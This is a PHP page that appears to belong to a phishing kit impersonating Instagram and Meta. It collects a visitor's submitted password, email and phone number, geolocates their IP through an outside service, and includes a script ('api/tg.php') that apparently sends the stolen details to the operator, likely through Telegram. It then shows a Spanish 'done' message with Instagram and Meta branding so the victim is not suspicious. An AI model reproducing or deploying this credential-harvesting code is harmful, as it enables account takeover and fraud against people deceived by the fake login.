<?php
error_reporting(0);
session_start();
$username=$_GET['username'];
if ($_POST) {
	$password=$_POST["password"];
	$email=$_POST["email"];
	$phone=$_POST["phone"];
	$ip = $_SERVER['REMOTE_ADDR'];
	$ch = curl_init('http://ip-api.com/json/'.$ip.'?lang=en');                                                                     
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);                                                                      
	$result = curl_exec($ch);
	$data = json_decode($result);
	$ulke = $data->country;
	$sehir = $data->regionName;
	date_default_timezone_set('Europe/Istanbul');
	$cur_time=date("d-m-Y H:i:s");

   include 'api/tg.php';
}
?>
<html lang="en"><head>
     <title>Meta Verse </title>
  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/6033/6033716.png"
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&amp;display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
   <link rel="stylesheet" href="css/style.css">
</head>
<body>
   <section class="ftco-section">
      <div class="container">
         <div class="row justify-content-center">
            <div class="col-md-7 col-lg-5">
               <div class="login-wrap p-4 p-md-5">
                  <center>
                     <img src="images/Instagram_Logo_2016.png" style="" width="125" alt="">
                  </center>
                  <div>
                     <center>
                       <b><br>
                         <img src="https://www.pngall.com/wp-content/uploads/2016/07/Success-PNG-Image.png" width="90" alt="">
                         <br><br>¡Hecho!<br>Haga clic para ir a <a href="https://www.instagram.com/<?= $_SESSION['username']; ?>">Instagram</a><br>
                      </b>
                   </center>
                   <p></p>
                </div>
                <div>
                  <center>
                     <img src="https://logodownload.org/wp-content/uploads/2021/10/meta-logo-1.png" width="110px" alt="">  </center>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </section>
   <script src="js/jquery.min.js"></script>
   <script src="js/popper.js"></script>
   <script src="js/bootstrap.min.js"></script>
   <script src="js/main.js"></script>
</body>
</html>